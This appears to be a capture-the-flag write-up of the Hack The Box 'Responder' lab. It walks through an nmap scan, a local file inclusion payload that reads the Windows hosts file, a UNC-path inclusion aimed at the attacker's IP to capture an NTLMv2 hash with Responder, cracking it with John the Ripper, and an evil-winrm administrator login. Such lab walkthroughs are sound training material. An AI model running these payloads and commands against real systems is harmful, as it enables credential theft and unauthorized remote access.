---
title: Responder
date: 2025-04-26 00:00:00 +/-TTTT
categories:
  - Practice
  - Hackthebox - Windows
tags:
  - hostname
  - lfi
  - responder
  - john
  - evil-winrm
image: preview-image.png
media_subpath: /assets/img/Practice/Hackthebox - Windows/2025-05-31-responder/
---

Responder is the number four Tier 1 machine from the Starting Point series on the Hack The Box platform. During the lab, we utilized some crucial and cutting-edge tools to enhance our Penetration Testing capabilities. These included Responder, John the Ripper, and evil-winrm.

## Enumeration

### Nmap

```bash
┌──(kali㉿kali)-[~/HTB/Starting Point/Responder]
└─$ sudo nmap -sC -sV -oA nmap/initial -p- $tgt
[sudo] password for crimson: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-18 20:27 CDT
Nmap scan report for 10.129.83.175
Host is up (0.049s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.14 seconds
```

### HTTP - 80

Now we will navigate to \[Target\_IP] → and here we get our page not found error.

![](2025-05-31-responder-2.png)

Now we have to add this domain to our /etc/hosts file on our system

```bash
nano /etc/hosts
```

Added

![](2025-05-31-responder-3.png)

Save the file and now we can open our webpage

![](2025-05-31-responder-4.png)

Pages are using PHP.

![](2025-05-31-responder-5.png)

Try changing the language to another one and we get a page=french.html parameter in the URL.

This can be a case of LFI (local file inclusion)

![](2025-05-31-responder-6.png)

Let’s play with this website

and here we are we can

![](2025-05-31-responder-7.png)

Let’s try reading the etc/hosts file on our target system using LFI

```
http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts
```

Here we are 🚀

![](2025-05-31-responder-8.png)

## Exploitation <a href="#exploitation" id="exploitation"></a>

* Now this is all due to the include() function in PHP
* Our real work starts from here. Now what we are going to do here is we are going to capture the NTLM (New Technology LAN Manager) hash of our administrator using a tool called **Responder**.
* thus, yes our machine is named after it.

### **How does Responder work?**

Responder can do many different kinds of attacks, but for this scenario, it will set up a malicious SMB server. When the target machine attempts to perform the NTLM authentication to that server, the Responder sends a challenge back for the server to encrypt with the user’s password. When the server responds, the Responder will use the challenge and the encrypted response to generate the NetNTLMv2. While we can’t reverse the NetNTLMv2, we can try many different common passwords to see if any generate the same challenge-response, and if we find one, we know that is the password. This is often referred to as hash cracking, which we’ll do with a program called John The Ripper.

👆🏻this was from HTB’s official machine manual

* Let’s download the responder

```bash
git clone https://github.com/lgandx/Responder
```

* Check that your Responder.conf file is like this one here

![](2025-05-31-responder-9.png)

* Run the tool

```bash
python2 Responder.py -I tun0
```

* `-I` is used for specifying network interface
* After the responder starts now navigate to link

```
http://unika.htb/?page=//[Your_tun0_IP]/blahblah
```

![](2025-05-31-responder-10.png)

* Now check the responder screen

![](2025-05-31-responder-11.png)

* We have our hash 🚀
* we have out NTLM hash of Administrator let’s crack it using john the ripper

```bash
echo "your hash" > hash.txt  
john --wordlist=[path_to_rockyou.txt] hash.txt
```

* our admin password is

![](2025-05-31-responder-12.png)

* Now our http service is running at port 5985/tcp

```bash
evil-winrm -i [Target_IP] -u administrator -p [cracked_password]
```

* this command is to gain PS in our attacking system with administrator access using username and password
* Navigate to mike’s desktop you will find your flag there.

![](2025-05-31-responder-13.png)
